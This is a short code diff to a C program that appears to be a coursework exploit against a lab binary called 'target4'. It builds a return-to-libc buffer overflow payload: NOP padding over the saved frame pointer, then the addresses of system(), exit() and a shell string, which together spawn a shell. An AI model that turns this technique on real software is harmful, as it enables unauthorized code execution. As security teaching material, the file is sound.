@@ -19,19 +19,14 @@ int main(void)
   printf("Env ptr: 0x%x, %p\n", env_ptr, env_ptr);
 
   char buffer[20]; // target4 takes size of 4, plus 3 bytes of fluff will get us to the ebp and eip
-  char randon[] = "SEXY";
-  // buffer[0] = 0; // address of system (ebp?)
-  // buffer[1] = 0; // address of exit (eip?)
-  // buffer[2] = 0; // address of "bin/sh"
   // EBP: Random
   // EIP: System
-  // EIP + 4: Dummy return
+  // EIP + 4: Dummy return (Can be exit())
   // EIP + 8: Shell address
-  memset(buffer, 0x90, 8); // overwrite EBP also
+  memset(buffer, 0x90, 8); // overwrite EBP also with NOP
   memcpy(buffer+8, system_addr, 4); // system address goes in EIP
-  // memcpy(buffer+8, exit_addr, 4); // TODO: Exit necessary?
-  // memcpy(buffer+8, random, 4); // Random stuff
-  memset(buffer+12, 'A', 4); // dummy return address
+  // memset(buffer+12, 'A', 4); // dummy return address (Can this be exit()?)
+  memcpy(buffer+12, exit_addr, 4); // Can this be exit()?
   memcpy(buffer+16, shell_addr, 4); // shell address
 
   args[0] = TARGET;
